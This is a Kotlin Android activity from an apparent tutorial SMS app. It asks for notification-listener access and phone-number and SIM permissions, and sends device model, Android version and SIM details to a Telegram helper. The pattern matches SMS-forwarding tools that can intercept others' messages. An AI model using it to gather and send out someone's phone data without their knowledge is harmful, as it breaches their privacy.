package com.kztutorial.sms

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private val phonePerms = arrayOf(
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_PHONE_NUMBERS,
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        findViewById<Button>(R.id.btnPermission).setOnClickListener {
            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
        }

        findViewById<Button>(R.id.btnPhonePermission).setOnClickListener {
            val missing = phonePerms.filter {
                ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
            }
            if (missing.isNotEmpty()) {
                ActivityCompat.requestPermissions(this, missing.toTypedArray(), 1001)
            } else {
                refreshDeviceInfo()
            }
        }

        findViewById<Button>(R.id.btnTest).setOnClickListener {
            val info = buildString {
                appendLine("📱 <b>${DeviceInfo.deviceLabel()}</b>")
                appendLine("🤖 ${DeviceInfo.androidVersion()}")
                appendLine(DeviceInfo.formatSims(this@MainActivity))
                appendLine("──────────────")
                appendLine("✅ Test notification from SMS app")
            }
            TelegramSender.send(this, info)
        }

        refreshDeviceInfo()
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray,
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 1001) refreshDeviceInfo()
    }

    private fun refreshDeviceInfo() {
        findViewById<TextView>(R.id.txtDevice)?.text = buildString {
            appendLine(DeviceInfo.deviceLabel())
            appendLine(DeviceInfo.androidVersion())
            append(DeviceInfo.formatSims(this@MainActivity))
        }
    }
}
